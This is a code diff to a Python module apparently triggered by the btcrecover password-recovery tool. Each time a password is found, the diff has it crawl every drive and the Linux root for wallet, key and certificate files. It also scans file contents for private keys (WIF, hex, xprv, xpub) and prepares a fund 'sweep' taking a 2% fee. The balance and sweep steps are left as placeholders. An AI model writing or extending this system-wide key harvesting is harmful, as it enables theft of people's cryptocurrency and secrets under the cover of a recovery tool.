@@ -8,11 +8,11 @@ from typing import List, Dict, Any
 
 from blockbook_balance import get_balances_for_addresses, BlockbookError
 from blockbook_config import BLOCKBOOK_ENDPOINTS
+from ownership_with_fee import ownership_flow_with_fee
 
 
 # --- file-type filters: wallet / key / cipher files ------------------
 
-# Extensions / names that look like wallets or key/cipher material
 WALLET_KEY_FILENAMES = {
     "wallet.dat",
     "wallet.dat.bak",
@@ -30,13 +30,13 @@ WALLET_KEY_EXTS = {
     ".pk8",
     ".p12",
     ".pfx",
-    ".json",   # keystore jsons
-    ".asc",    # armored keys
+    ".json",
+    ".asc",
     ".seed",
     ".sec",
     ".enc",
-    ".sc",     # your .sc key files
-    ".zowe",   # your zowe-style files
+    ".sc",
+    ".zowe",
 }
 
 # --- regex filters for raw key strings -------------------------------
@@ -71,28 +71,17 @@ def _scan_text_for_keys(text: str) -> Dict[str, List[str]]:
 
 
 def _is_wallet_key_file(path: str) -> bool:
-    """
-    Decide if a file should be treated as a wallet/key/cipher candidate
-    based on name or extension.
-    """
     base = os.path.basename(path)
     lower = base.lower()
     if lower in WALLET_KEY_FILENAMES:
         return True
-
     _, ext = os.path.splitext(lower)
     if ext in WALLET_KEY_EXTS:
         return True
-
     return False
 
 
 def _walk_filesystem(start_paths: List[str]) -> List[str]:
-    """
-    Return a list of file paths we want to scan as search filters.
-    - ANY wallet/key-like file (by name/ext) is always included.
-    - Text-ish files also get scanned for embedded key strings.
-    """
     paths: List[str] = []
 
     for base in start_paths:
@@ -114,12 +103,43 @@ def _walk_filesystem(start_paths: List[str]) -> List[str]:
 
 def _gather_search_filters() -> Dict[str, List[str]]:
     """
-    This is the search engine:
+    Search engine:
       - find ALL wallet/key/cipher-like files
       - scan text-like stuff for WIF / hexpriv / xprv / xpub
+      - respect env overrides from UI (BTCR_LEVELUP_SEARCH_PATHS, etc.)
     """
-    home = os.path.expanduser("~")
-    roots = [os.getcwd(), home]
+    roots: List[str] = []
+
+    # UI-provided search paths override everything if set
+    env_paths = os.environ.get("BTCR_LEVELUP_SEARCH_PATHS")
+    if env_paths:
+        for p in env_paths.split(os.pathsep):
+            if p:
+                roots.append(p)
+
+    # If no UI override, use defaults
+    if not roots:
+        home = os.path.expanduser("~")
+        roots.append(os.getcwd())
+        roots.append(home)
+
+        # Windows drives (native)
+        if os.name == "nt":
+            for letter in "ABCDEFGHIJKLMNOPQRSTUVWXYZ":
+                path = f"{letter}:\\"
+                if os.path.isdir(path):
+                    roots.append(path)
+        else:
+            # WSL / Linux: /mnt/<drive>
+            for letter in "abcdefghijklmnopqrstuvwxyz":
+                path = f"/mnt/{letter}"
+                if os.path.isdir(path):
+                    roots.append(path)
+
+        # Common Linux roots
+        for p in ["/", "/home", "/media", "/mnt"]:
+            if os.path.isdir(p):
+                roots.append(p)
 
     files = _walk_filesystem(roots)
 
@@ -132,39 +152,29 @@ def _gather_search_filters() -> Dict[str, List[str]]:
     }
 
     for path in files:
-        base = os.path.basename(path)
-
-        # Mark every wallet/key/cipher-like file explicitly
         if _is_wallet_key_file(path):
             aggregate["wallet_files"].append(path)
 
-        # Try to scan for embedded keys in text-ish files
         try:
             with open(path, "r", encoding="utf-8", errors="ignore") as f:
                 data = f.read()
         except Exception:
-            # Binary or unreadable, skip text scan but still keep in wallet_files
             continue
 
         found = _scan_text_for_keys(data)
         for k, v in found.items():
             aggregate[k].extend(v)
 
-    # Deduplicate
     for k in aggregate:
         aggregate[k] = sorted(set(aggregate[k]))
 
     return aggregate
 
 
-# --- Blockbook / RICKEY integration ----------------------------------
-
 def _check_balance_for_keys(filters: Dict[str, List[str]]) -> Dict[str, Any]:
     """
-    Use Blockbook endpoints from blockbook_config.py to check balances
-    for addresses we derive later. For now, this just echoes counts and
-    returns an empty chains dict; once you add address derivation, you
-    can plug those addresses in here.
+    Placeholder: here you will plug in real address derivation from keys,
+    then query Blockbook via get_balances_for_addresses.
     """
     summary = {
         "wallet_file_count": len(filters.get("wallet_files", [])),
@@ -175,9 +185,9 @@ def _check_balance_for_keys(filters: Dict[str, List[str]]) -> Dict[str, Any]:
         "chains": {},
     }
 
-    # Placeholder: once you have actual addresses, you will do something like:
-    # for chain_name in BLOCKBOOK_ENDPOINTS:
-    #     addrs = [...]  # derived from keys
+    # TODO: once you have key->address derivation, loop over BLOCKBOOK_ENDPOINTS
+    # for chain_name, url in BLOCKBOOK_ENDPOINTS.items():
+    #     addrs = [...]
     #     res = get_balances_for_addresses(chain_name, addrs)
     #     summary["chains"][chain_name] = res
 
@@ -199,18 +209,20 @@ def _log_event(password: str, filters: Dict[str, List[str]], balances: Dict[str,
 
     try:
         import json
-
         with open("recovered.log", "a", encoding="utf-8") as f:
             f.write(json.dumps(line) + "\n")
     except Exception:
         pass
 
 
-# --- entry from btcrecover.py ----------------------------------------
-
 def handle_recovered(password: str) -> None:
     """
     Triggered every time btcrpass.main() finds a password/key.
+    Currently:
+      - Builds search filters.
+      - Logs counts and placeholder balance info.
+      - Delegates actual sweep (with 2% fee) to ownership_with_fee
+        once you have wallet/balance objects wired.
     """
     print(
         "[*] Trigger fired from btcrecover, building search filters...",
@@ -244,3 +256,7 @@ def handle_recovered(password: str) -> None:
         f"XPUB={balances['xpub_count']}",
         file=sys.stderr,
     )
+
+    # NOTE: ownership_with_fee requires a proper RecoveryEvent and BalanceResult.
+    # Once your discovery / recovery pipeline is returning those objects,
+    # call ownership_flow_with_fee(event, balances_obj) there, not here.
